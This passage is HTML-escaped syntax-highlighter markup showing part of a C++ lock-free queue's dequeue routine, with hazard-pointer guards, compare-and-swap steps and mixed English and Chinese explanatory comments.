&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-92&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Read and guard our Head m_pHead&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-93&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;protect&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;node_to_value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-94&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// and the element that follows the Head&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-95&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;protect&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;node_to_value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-96&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Check: is what we have just read &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-97&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// remains bounded?..&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-98&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-99&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// no, - someone has managed to spoil everything... &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-100&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Start all over again&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-101&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-102&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-103&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-104&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            此标记显示队列已空&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-105&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            注意与tail不同的是，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-106&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            H=head始终不会错的&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-107&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-108&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-109&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                 &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// the queue is empty&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-110&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-111&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            此处读取tail，但未采用Hazard Pointer对其进行保护&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-112&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            我们对其指向的上下文（数据结构中字段）不感兴趣&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-113&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-114&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_acquire&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-115&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-116&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-117&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  糟糕，有头无尾&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-118&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  元素紧随头之后，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-119&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  并且尾指向头。&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-120&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  我想到了应该纠错的时候了&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-121&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-122&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;compare_exchange_strong&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-123&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-124&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// After helping them, we have to start over. &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-125&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Therefore, the CAS result is not important for us&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-126&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-127&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-128&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// The most important thing is to link a new Head&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-129&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// That is, we move down the list&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-130&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;compare_exchange_strong&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-131&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;relaxed&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-132&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-133&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Success! Terminate our infinite loop&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-134&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-135&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-136&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-137&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            倘若失败，意味着有其干预；&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-138&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            不干扰它们，退回去小歇片刻&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-139&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-140&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;bkoff&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-141&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-142&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Change the not very useful counter of elements, &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-143&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// see the comment in enqueue&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-144&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_ItemCounter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-145&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// It’s the call of &#39;remove the h element&#39; functor&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-146&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dispose_node&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-147&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/* &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-148&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;   /*&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-149&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;   有趣的是，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-150&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;   返回[ex] Head后面的元素，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-151&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;   但pNext仍然在队列中-&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-152&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;   这是队列的新头部！&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-153&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;  */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-154&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-155&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-156&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
